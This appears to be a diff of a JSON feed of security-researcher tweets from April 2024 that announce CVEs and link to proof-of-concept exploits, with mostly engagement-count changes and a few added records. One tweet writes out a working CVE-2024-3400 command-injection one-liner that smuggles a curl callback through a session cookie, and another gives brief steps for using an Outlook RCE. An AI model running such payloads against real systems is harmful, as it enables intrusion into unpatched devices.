@@ -16,10 +16,10 @@
     "expanded_url": [
         "https://www.youtube.com/watch?v=etHDJWYElso"
     ],
-    "tweetfavorites": 197,
+    "tweetfavorites": 188,
     "tweetquotes": 1,
-    "tweetreplies": 8,
-    "tweetretweets": 42,
+    "tweetreplies": 7,
+    "tweetretweets": 40,
     "tweettext": "The CrushFTP vulnerability, CVE-2024-4040 -- demo of the file inclusion trick and some of the speculation on the sessions.obj usage to gain remote code execution (I recorded this mid-week before some of the other public analysis was out 😅)\nhttps://t.co/ZIO26cz8ip https://t.co/824issyqEb",
     "tweettime": "2024-04-26, 15:00:20",
     "tweeturl": "https://twitter.com/_JohnHammond/status/1783873752813420802",
@@ -50,6 +50,19 @@
     "tweettime": "2024-04-24, 18:27:45",
     "tweeturl": "https://twitter.com/wdormann/status/1783201177770852484",
     "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://github.com/mansk1es/CVE-2024-21111"
+    ],
+    "tweetfavorites": 98,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "CVE-2024-21111: Vulnerability in the Oracle VM VirtualBox product of Oracle Virtualization (component: Core). Local Privilege Escalation via Symbolic Link Following leading to Arbitrary File Delete and Arbitrary File Move.\n\nPoC\nhttps://t.co/sthDVj09GC https://t.co/XZ5MBlcgAA",
+    "tweettime": "2024-04-23, 07:58:41",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1782680478341816557",
+    "username": "cyber_advising"
 }
 {
     "expanded_url": [
@@ -129,10 +142,10 @@
         "https://github.com/hakaioffsec/CVE-2024-21338",
         "https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/"
     ],
-    "tweetfavorites": 615,
+    "tweetfavorites": 595,
     "tweetquotes": 2,
     "tweetreplies": 3,
-    "tweetretweets": 206,
+    "tweetretweets": 204,
     "tweettext": "PoC Exploit Released for 0-day Windows Kernel \nof Privilege Vulnerability (CVE-2024-21338) : https://t.co/vBcaCQ9MSi\n\nhttps://t.co/vHofGL819e\n\nDetails : https://t.co/ngV9GWaYDU https://t.co/FP2Wf6WT7I",
     "tweettime": "2024-04-17, 08:46:32",
     "tweeturl": "https://twitter.com/binitamshah/status/1780518191929897042",
@@ -149,10 +162,10 @@
     "username": "wvuuuuuuuuuuuuu"
 }
 {
-    "tweetfavorites": 372,
+    "tweetfavorites": 363,
     "tweetquotes": 3,
     "tweetreplies": 5,
-    "tweetretweets": 107,
+    "tweetretweets": 105,
     "tweettext": "CVE-2024-3400 POC - Proof Of Concept. Tested.\necho \"target\" | httpx -x POST -path \"/ssl-vpn/hipreport.esp\" -H \"Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere`curl${IFS}YOURTOKEN`;\"  -v -t 10 -mc 200 \n\nOutput from target. curl version -\n#paloalto #poc https://t.co/6TmCtOrBvt",
     "tweettime": "2024-04-16, 16:07:57",
     "tweeturl": "https://twitter.com/Chirag99Artani/status/1780266892944670901",
@@ -198,20 +211,20 @@
     "expanded_url": [
         "https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/"
     ],
-    "tweetfavorites": 214,
+    "tweetfavorites": 212,
     "tweetquotes": 1,
     "tweetreplies": 4,
-    "tweetretweets": 56,
+    "tweetretweets": 55,
     "tweettext": "Auth. Bypass (CVE-2024-28255) and SpEL Injection (CVE-2024-28254) in OpenMetadata lead to a critical RCE (OOB Data Exfiltration).\n\nTechnical details &amp; PoC: https://t.co/zaBuKjY1RH\nMitigation: Update to Patched v1.2.4 or newer.\nCredit for the original discovery goes to @pwntester https://t.co/QdACJ4wUre",
     "tweettime": "2024-04-14, 05:58:06",
     "tweeturl": "https://twitter.com/win3zz/status/1779388643523842127",
     "username": "win3zz"
 }
 {
-    "tweetfavorites": 230,
+    "tweetfavorites": 222,
     "tweetquotes": 0,
     "tweetreplies": 6,
-    "tweetretweets": 52,
+    "tweetretweets": 49,
     "tweettext": "It’s Sunday 07:03 am and I decided to read @Volexity‘s article on UTA0218‘s post exploitation activity (PaloAlto CVE-2024-3400). \nI saw that a generic rule of mine detected the new UPSTYLE backdoor when it was uploaded to VT yesterday (while no one else had detections for it) and https://t.co/mXstwXmXtg",
     "tweettime": "2024-04-14, 05:13:35",
     "tweeturl": "https://twitter.com/cyb3rops/status/1779377441011565011",
@@ -223,10 +236,10 @@
         "https://unit42.paloaltonetworks.com/cve-2024-3400/",
         "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
     ],
-    "tweetfavorites": 578,
+    "tweetfavorites": 550,
     "tweetquotes": 3,
-    "tweetreplies": 11,
-    "tweetretweets": 130,
+    "tweetreplies": 12,
+    "tweetretweets": 125,
     "tweettext": "CVE-2024-3400: OS Command Injection Vulnerability in GlobalProtect Gateway\n\nSeverity: CRITICAL (10/10) ⚠️\n\nPoc: https://t.co/IMw8YQap2q\n\nOther info: \nhttps://t.co/VBttcYwwoJ\nhttps://t.co/0YsIHHirTX https://t.co/wbG4eCbsW3",
     "tweettime": "2024-04-13, 14:05:06",
     "tweeturl": "https://twitter.com/win3zz/status/1779148811497267352",
@@ -259,14 +272,28 @@
     "expanded_url": [
         "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
     ],
-    "tweetfavorites": 462,
+    "tweetfavorites": 434,
     "tweetquotes": 8,
     "tweetreplies": 11,
-    "tweetretweets": 166,
+    "tweetretweets": 151,
     "tweettext": "Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)\n\n172.233.228[.]93\n\nhttps://t.co/a3Rf1zgIZT https://t.co/6sU71axOWT",
     "tweettime": "2024-04-13, 04:00:30",
     "tweeturl": "https://twitter.com/blackorbird/status/1778996658845724854",
     "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://bazaar.abuse.ch/sample/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac/",
+        "https://volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/"
+    ],
+    "tweetfavorites": 328,
+    "tweetquotes": 2,
+    "tweetreplies": 7,
+    "tweetretweets": 130,
+    "tweettext": "#UPSTYLE backdoor targeting GlobalProtect VPN devices via CVE-2024-3400 in 3 images/stages 🔥 #0day \n[+] https://t.co/DSdt5OldLo \n\nAll technical details in the blogs of: \n+ Volexity (#UTA0218): https://t.co/jt7DVfsgCs\n+ Unit 42 (Operation #MidnightEclipse): https://t.co/LsuN2WesJp",
+    "tweettime": "2024-04-12, 22:59:44",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1778920968078975262",
+    "username": "1ZRR4H"
 }
 {
     "expanded_url": [
@@ -298,10 +325,10 @@
     "expanded_url": [
         "https://gist.github.com/Homer28/7f3559ff993e2598d0ceefbaece1f97f"
     ],
-    "tweetfavorites": 439,
+    "tweetfavorites": 428,
     "tweetquotes": 2,
     "tweetreplies": 1,
-    "tweetretweets": 137,
+    "tweetretweets": 130,
     "tweettext": "CVE-2024-21378: Microsoft Outlook Remote Code Execution Vulnerability\n\nPoC\nhttps://t.co/YYFI0v1dQP https://t.co/sqrj1cPBd4",
     "tweettime": "2024-04-12, 07:10:18",
     "tweeturl": "https://twitter.com/cyber_advising/status/1778682036087099688",
@@ -321,10 +348,10 @@
     "expanded_url": [
         "https://gist.github.com/Homer28/7f3559ff993e2598d0ceefbaece1f97f"
     ],
-    "tweetfavorites": 344,
+    "tweetfavorites": 338,
     "tweetquotes": 3,
     "tweetreplies": 4,
-    "tweetretweets": 128,
+    "tweetretweets": 125,
     "tweettext": "🏭 We've tested the new RCE in Microsoft Outlook (CVE-2024-21378) in a production environment and confirm it works well!\n\nA brief instruction for red teams:\n\n1. Compile our enhanced DLL 👉 https://t.co/cQWF8KM8vL\n2. Use NetSPI's ruler and wait!\n\nNo back connect required!\n\n🔥 📐📏 https://t.co/aVDyT4d4B9",
     "tweettime": "2024-04-11, 13:53:33",
     "tweeturl": "https://twitter.com/ptswarm/status/1778421129193136338",
@@ -341,14 +368,29 @@
     "username": "wvuuuuuuuuuuuuu"
 }
 {
-    "tweetfavorites": 148,
+    "tweetfavorites": 139,
     "tweetquotes": 0,
     "tweetreplies": 7,
-    "tweetretweets": 18,
+    "tweetretweets": 17,
     "tweettext": "LayerSlider CVE-2024-2879 SQLi Exploitation ;)\n#hacking #exploit #0day https://t.co/okpP7TlYCI",
     "tweettime": "2024-04-09, 22:56:08",
     "tweeturl": "https://twitter.com/dudu_maragno/status/1777832901326799010",
     "username": "dudu_maragno"
+}
+{
+    "expanded_url": [
+        "https://github.com/Wh04m1001/UserManagerEoP",
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36047",
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21447"
+    ],
+    "tweetfavorites": 246,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 87,
+    "tweettext": "I published my PoC for CVE-2023-36047 as MSRC fixed the bypass today tracked as CVE-2024-21447. With some modification can be ported for CVE-2024-21447.\nhttps://t.co/c7QBlFnuW7\nhttps://t.co/wnamFz9MJM\nhttps://t.co/VOYmZmnSHJ",
+    "tweettime": "2024-04-09, 19:59:08",
+    "tweeturl": "https://twitter.com/filip_dragovic/status/1777788357973516568",
+    "username": "filip_dragovic"
 }
 {
     "expanded_url": [
@@ -364,10 +406,10 @@
     "username": "sensepost"
 }
 {
-    "tweetfavorites": 212,
+    "tweetfavorites": 205,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 58,
+    "tweetretweets": 57,
     "tweettext": "🚨Alert🚨CVE-2024-3116: Remote Code Execution (RCE) in pgAdmin version 8.4 or below.(CVSS: 7.4)\n⚠This vulnerability allows attackers to execute malicious code on servers running pgAdmin, potentially compromising the entire database system.\n📊 1K+ Services are found on https://t.co/4ViJhdnljj",
     "tweettime": "2024-04-07, 02:26:30",
     "tweeturl": "https://twitter.com/HunterMapping/status/1776798677128130683",
@@ -377,10 +419,10 @@
     "expanded_url": [
         "https://github.com/Notselwyn/CVE-2024-1086"
     ],
-    "tweetfavorites": 1675,
+    "tweetfavorites": 1594,
     "tweetquotes": 9,
-    "tweetreplies": 18,
-    "tweetretweets": 459,
+    "tweetreplies": 17,
+    "tweetretweets": 428,
     "tweettext": "CVE-2024-1086 (Local Privilege Escalation) \n-\nWhile the xz backdoor was all over the place, this incredible exploit seemed to \"slip\" by!\n-\nThis is working on most Linux kernels from 5.14 to v6.6\n-\nRepo: https://t.co/C9wmPd7LuS\n-\nCreator: @notselwyn https://t.co/MUpTPau8Tz",
     "tweettime": "2024-04-06, 14:23:51",
     "tweeturl": "https://twitter.com/0dayCTF/status/1776616816460050891",
@@ -392,10 +434,10 @@
         "https://github.com/pgadmin-org/pgadmin4/commit/fbbbfe22dd468bcfef1e1f833ec32289a6e56a8b",
         "https://nvd.nist.gov/vuln/detail/CVE-2024-3116"
     ],
-    "tweetfavorites": 103,
+    "tweetfavorites": 100,
     "tweetquotes": 4,
     "tweetreplies": 2,
-    "tweetretweets": 29,
+    "tweetretweets": 28,
     "tweettext": "CVE-2024-3116: Remote Code Execution (RCE) in pgAdmin version 8.4 or below.\nSeverity: HIGH\nMitigation: Upgrade\n\nProof of Concept: https://t.co/icV5Zag24e.\nPatch Commit: https://t.co/xgmUqtSGcz\nAdvisory: https://t.co/uNfX0wwvQ7\nCredit for the original discovery goes to @aessadek https://t.co/iUc946oHhn",
     "tweettime": "2024-04-05, 05:39:20",
     "tweeturl": "https://twitter.com/win3zz/status/1776122427619381683",
@@ -415,10 +457,10 @@
     "username": "Dinosn"
 }
 {
-    "tweetfavorites": 251,
+    "tweetfavorites": 242,
     "tweetquotes": 2,
     "tweetreplies": 1,
-    "tweetretweets": 83,
+    "tweetretweets": 81,
     "tweettext": "🚨Alert🚨CVE-2023-50969: Critical Flaw in Imperva SecureSphere WAF Could Lead to Devastating Breaches\n⚠ By manipulating the “Content-Encoding” headers in HTTP requests and sending specifically encoded POST data, attackers can effectively slip malicious payloads past the WAF’s https://t.co/2jtWzBWEaf",
     "tweettime": "2024-04-01, 03:12:46",
     "tweeturl": "https://twitter.com/HunterMapping/status/1774635992626167907",
